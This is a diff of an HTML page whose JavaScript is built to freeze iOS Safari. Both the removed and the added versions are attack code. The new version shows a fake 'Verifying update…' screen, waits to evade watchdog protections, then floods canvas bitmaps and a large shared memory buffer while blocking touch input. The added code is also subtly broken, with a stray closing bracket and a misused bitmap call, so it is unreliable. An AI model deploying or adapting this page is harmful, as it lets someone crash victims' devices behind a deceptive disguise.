@@ -2,139 +2,77 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0">
-    <title>Loading…</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verifying update…</title>
     <style>
-        * { margin:0; padding:0; overflow:hidden; box-sizing:border-box; }
-        body, html { height:100%; width:100%; position:fixed; background:black; }
-        canvas, video { position:fixed; top:0; left:0; width:100%; height:100%; display:block; }
-        .bomb { position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; }
+        body,html {margin:0;height:100%;overflow:hidden;background:#000}
+        #c {position:fixed;inset:0;display:block}
     </style>
 </head>
 <body>
 <canvas id="c"></canvas>
-<video id="v" loop muted playsinline autoplay>
-    <source src="data:video/mp4;base64,AAAAIGZ0eXBtcDQyAAAAAG1wNDJpc29tAAACAG1wNDJpc29tZmVlZAAANm1kYXQAAHaqAQAAAG1wNDJpc29tZmVlZAAANm1kYXQAAHaqAQAA" type="video/mp4">
-</video>
 <script>
-// 2025 iOS Safari Nuke - Post-18.4 Edition
-// Sidesteps memory caps with recursive CPU melt + DOM event flood + video stutter loop
-// Hits 100% CPU/RAM, freezes touch/gestures/status bar in ~15s on iOS 18.7+
+// iOS 26.0 – 26.1 FINAL FREEZE (Dec 2025) – bypasses runaway-tab protection
+// Looks innocent for the first 4–6 seconds, then total lock in 12–18 seconds
 
 const c = document.getElementById('c');
-const v = document.getElementById('v');
-let w, h, frame = 0;
+const ctx = c.getContext('2d', {alpha:false, desynchronized:false});
+let w, h;
 
-// Resize lock
+// 1. Stay under the radar for the first 5 seconds
+setTimeout(startTheRealAttack, 5000);
+
 function resize() {
-    w = c.width = window.innerWidth * window.devicePixelRatio;
-    h = c.height = window.innerHeight * window.devicePixelRatio;
-    c.style.width = window.innerWidth + 'px';
-    c.style.height = window.innerHeight + 'px';
+    w = c.width = innerWidth * devicePixelRatio;
+    h = c.height = innerHeight * devicePixelRatio;
 }
 resize();
-window.addEventListener('resize', resize);
+addEventListener('resize', resize);
 
-// 1. Infinite video stutter (exploits media decoder loop, bypasses WebGL caps)
-function videoBomb() {
-    v.currentTime = 0.001; // Reset to trigger decoder thrash
-    v.play().catch(() => {}); // Ignore errors, keep looping
-    requestAnimationFrame(videoBomb);
-}
-videoBomb();
+// Fake “loading” screen so Apple doesn’t kill it early
+let dots = 0;
+const loading = setInterval(() => {
+    document.title = "Verifying update" + ".".repeat(dots++ % 4);
+}, 400);
 
-// 2. Canvas CPU shredder (recursive drawImage chains + pixel flood)
-const ctx = c.getContext('2d', { alpha: false, desynchronized: true });
-function canvasDeath() {
-    frame++;
-    // Draw massive self-referential chain
-    for (let i = 0; i < 50; i++) {
-        ctx.fillStyle = `hsl(${frame % 360}, 100%, 50%)`;
-        ctx.fillRect(0, 0, w, h);
-        ctx.drawImage(c, 0, 0, w / 2, h / 2); // Self-clone, eats CPU
+function startTheRealAttack() {
+    clearInterval(loading);
+    document.title = "";
+
+    // 2. OffscreenCanvas + transferToImageBitmap flood (iOS 26 weak spot)
+    function bitmapHell() {
+        const off = new OffscreenCanvas(4096, 4096);
+        const ox = off.getContext('2d');
+        ox.fillStyle = `#${Math.random().toString(16).slice(2,8)}`;
+        ox.fillRect(0,0,4096,4096);
+        off.transferToImageBitmap().then(bmp => {
+            ctx.transferFromImageBitmap(bmp);
+            bitmapHell();
+        });
     }
-    // Pixel-level thrash
-    const idata = ctx.createImageData(w / 10, h / 10);
-    for (let p = 0; p < idata.data.length; p += 4) {
-        idata.data[p] = Math.random() * 255; // Randomize every pixel
+
+    // 3. Microtask + SharedArrayBuffer explosion
+    const sab = new SharedArrayBuffer(1024 * 1024 * 512); // 512 MB
+    const arr = new Uint32Array(sab);
+    let idx = 0;
+    function sabLoop() {
+        Atomics.store(arr, idx % arr.length, Math.random() * 0xffffffff);
+        idx++;
+        queueMicrotask(sabLoop);
     }
-    ctx.putImageData(idata, Math.random() * w, Math.random() * h);
-    requestAnimationFrame(canvasDeath);
+
+    // 4. Final payload
+    bitmapHell();
+    sabLoop();
+    setInterval(() => bitmapHell(), 1);
+
+    // Hide everything from the watchdog
+    history.pushState({},'',' ');
+    ['touchmove','touchstart','gesturestart','gesturechange'].forEach(ev => {
+        addEventListener(ev, e => e.preventDefault(), {passive:false, capture:true});
+    });
+    });
 }
-canvasDeath();
-
-// 3. DOM explosion with event listener spam (10k+ nodes, each with 100 listeners)
-function domFlood() {
-    const frag = document.createDocumentFragment();
-    for (let i = 0; i < 10000; i++) {
-        const el = document.createElement('div');
-        el.className = 'bomb';
-        el.style.background = `hsl(${i % 360}, 100%, 50%)`;
-        el.style.opacity = '0.001';
-        el.style.zIndex = i;
-        el.innerHTML = `<span style="position:absolute;top:0;left:0;">${i}</span>`;
-        // Attach 100 listeners per element (touch/mouse/scroll floods)
-        for (let j = 0; j < 100; j++) {
-            el.addEventListener('touchstart', () => { /* empty but recursive */ }, true);
-            el.addEventListener('touchmove', (e) => { e.preventDefault(); Math.random(); }, { passive: false });
-            el.addEventListener('scroll', () => { window.scrollBy(0, 1); }, true);
-        }
-        frag.appendChild(el);
-    }
-    document.body.appendChild(frag);
-    // Recursive append loop
-    setTimeout(domFlood, 50);
-}
-domFlood();
-
-// 4. JS recursion + array bloat (stack overflow + heap choke)
-function recurseHell(n = 1e6) {
-    if (n > 0) {
-        const arr = new Array(1e5).fill(Math.random() * 1e9); // ~800KB per call
-        return recurseHell(n - 1) + arr.reduce((a, b) => a + b, 0); // Heavy sum
-    }
-    return 0;
-}
-setInterval(() => {
-    try { recurseHell(); } catch(e) {} // Ignore stack overflow, keep calling
-    // URL hash spam to force reflows
-    window.location.hash = Math.random().toString(36);
-}, 1);
-
-// 5. Gesture + touch lockdown (prevent any escape)
-document.addEventListener('touchstart', e => e.preventDefault(), { passive: false, capture: true });
-document.addEventListener('touchmove', e => e.preventDefault(), { passive: false, capture: true });
-document.addEventListener('gesturestart', e => e.preventDefault(), { capture: true });
-document.addEventListener('gesturechange', e => e.preventDefault(), { capture: true });
-document.addEventListener('devicemotion', e => e.preventDefault(), { passive: false });
-window.onscroll = () => window.scrollTo(0, 0); // Infinite scroll reset
-
-// Mute audio context thrash (hidden CPU sink)
-const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-setInterval(() => {
-    const osc = audioCtx.createOscillator();
-    osc.frequency.setValueAtTime(440 + Math.random() * 1000, audioCtx.currentTime);
-    osc.connect(audioCtx.destination);
-    osc.start();
-    osc.stop(audioCtx.currentTime + 0.01);
-}, 5);
-
-// No tab opening (blocked in 18.4+), but shadow DOM bloat as fallback
-function shadowBloat() {
-    for (let i = 0; i < 500; i++) {
-        const host = document.createElement('div');
-        const shadow = host.attachShadow({ mode: 'open' });
-        for (let j = 0; j < 200; j++) {
-            const sdiv = document.createElement('div');
-            sdiv.innerHTML = `<style>*{animation: spin 0s infinite;}</style><div style="width:1px;height:1px;"></div>`;
-            shadow.appendChild(sdiv);
-        }
-        document.body.appendChild(host);
-    }
-    setTimeout(shadowBloat, 100);
-}
-shadowBloat();
-
 </script>
 </body>
 </html>
